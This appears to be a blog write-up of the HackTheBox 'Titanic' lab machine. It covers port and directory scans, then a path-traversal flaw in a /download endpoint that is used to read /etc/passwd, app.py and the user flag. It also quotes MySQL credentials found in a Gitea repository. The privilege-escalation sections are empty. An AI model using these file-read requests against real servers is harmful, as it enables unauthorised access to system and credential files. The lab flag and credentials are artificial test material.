---
title: 'Season 7 - Titanic'
description: 'Writeup for Titanic box'
pubDate: 'Feb 26 2025'
heroImage: 'blog-placeholder-4.jpg'
---

**Difficulty: Easy**

## Information Gathering

### Port scan

```bash
kali$ nmap -sV -sC $TARGET

22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
|_  256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://titanic.htb/
Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.32 seconds
```

## Enumeration  

### Web server - `titanic.htb`
Running on host `titanic.htb`. So let's add it to our `/etc/hosts` file and begin exploring the site. 

Http response header:
`Server: Werkzeug/3.0.3 Python/3.10.12`

#### Path enumeration
After poking around a bit, we see there's only one page but with a form to book a trip. Let's enumerate the site to see if there's any interesting paths.

```bash
kali$ gobuster dir -u http://titanic.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://titanic.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/download             (Status: 400) [Size: 41]
/book                 (Status: 405) [Size: 153]
/server-status        (Status: 403) [Size: 276]
```

Let's dig in to these endpoints. Once we book a trip via `POST /book`, a JSON file is downloaded from a `/download` endpoint. Examining these requests in Burpsuite don't raise any immediate red flags.

The flow looks like:

```bash
# Request 1
POST /book
Host: titanic.htb
Cintent-Type: application/x-www-form-urlencoded
...

name=a&email=a%40a.com&phone=1234567890&date=2025-02-28&cabin=Suite

# Response 1
Redirecting you to /download?ticket=<uuid>.json

# Request 2
GET /download?ticket=e3b22b09-33ad-434f-9d10-f022cf07efc4.json HTTP/1.1
Host: titanic.htb

# Response 2
...
'{ "name": "a", "email": "a@a.com", "phone": "1234567890", "date": "2025-02-28", "cabin": "Standard"}'
```

When looking at this, it does seem odd that the `.json` prefix is required. By removing the prefix, we see the response `404 Ticket not found`. Interesting... I suspect this site may be vulnerable to a local file inclusion vulnerability. Let's try another file:

```bash
GET http://titanic.htb/download?ticket=/etc/hosts

## Response
HTTP/1.1 200 OK
Date: Wed, 26 Feb 2025 01:06:48 GMT
Server: Werkzeug/3.0.3 Python/3.10.12
Content-Disposition: attachment; filename="/etc/hosts"
Content-Type: application/octet-stream
Content-Length: 250
Last-Modified: Fri, 07 Feb 2025 12:04:36 GMT
Cache-Control: no-cache
ETag: "1738929876.3570278-250-324273100"
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

127.0.0.1 localhost titanic.htb dev.titanic.htb
127.0.1.1 titanic

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Aha! We've downloaded the hosts file. Interestingly the file contents are in the body of the response, which would imply that the web server is opening and reading the file.

Let's use gobuster to enumerate

```bash
kali$ gobuster dir -u http://titanic.htb/download?ticket=/var/www/html -w /usr/share/wordlists/dirb/common.txt

/index.html         (Status: 200)  [Size: 303]
```

This is the default apache page... No luck.

Trying to download `../app.py` was successful. From here we can infer some info about the directory structure:
```
webroot/
|- app.py
|- templates/
|  |- index.html
|- tickets/
   |- *.json
```

Inspecting the code, we confirm the web app only contains `/`, `/book` and `/download`. It stores tickets in the `tickets` subdirectory and does not validate the path when retrieving a ticket file. There's no secrets in this file, so we need to continue the hunt on how to exploit...

### Subdomain - `dev.titanic.htb`
It seems common practice with LFI to extract a bunch of common files such as `/etc/passwd`, `/etc/hosts`, `/etc/shadow` if permissions allow, `/etc/issue` or `/etc/os-release`. There's also some procs `/proc/version`, `/proc/cpuinfo`, and `/proc/meminfo`.

We were able to extract the `passwd` and `hosts` file successfully. Inspecting the hosts file, we find a `dev.titanic.htb` subdomain! A new site for us to explore. It's a self-hosted git service `gitea`. It has 2 repositories:
* `flask-app` which is the code for the `titanic.htb` site; and
* `docker-config`

Exploring docker-config, there are 2 folders: one for the Gitea service, and another for a MySQL db. The MySQL service is exposed on port `3306` of the host. The MySQL dockerfile has the credentials and details hardcoded in the file:

```yaml
MYSQL_ROOT_PASSWORD: 'MySQLP@$$w0rd!'
MYSQL_DATABASE: tickets 
MYSQL_USER: sql_svc
MYSQL_PASSWORD: sql_password
```

Beyond this, it seems that the next steps from taking a sneak peek at a writeup is to continue enumerating the file system to find out data. Figure out where files are stored, read config values to get from one service to the next. I'm guessing we'll stumble upon some credentials or way to use the above credentials somehow.


## Exploitation

### LFI
Having discovered the site was vulnerable to LFI earlier, we can extract the `/etc/passwd` file to see what users exist. 

```
root:x:0:0:root:/root:/bin/bash
...
developer:x:1000:1000:developer:/home/developer:/bin/bash
...
```


## Privilege Escalation

## Post-Exploitation

### User flag
Using LFI, we can extract the `/etc/passwd` file to see what users exist. From here we see a user named `developer` exists. We can then use the download endpoint to get the file

```bash
GET http://titanic.htb/download?ticket=/home/developer/user.txt
d59e02a08933fa8830dc0db32b35f53b

## Notes & References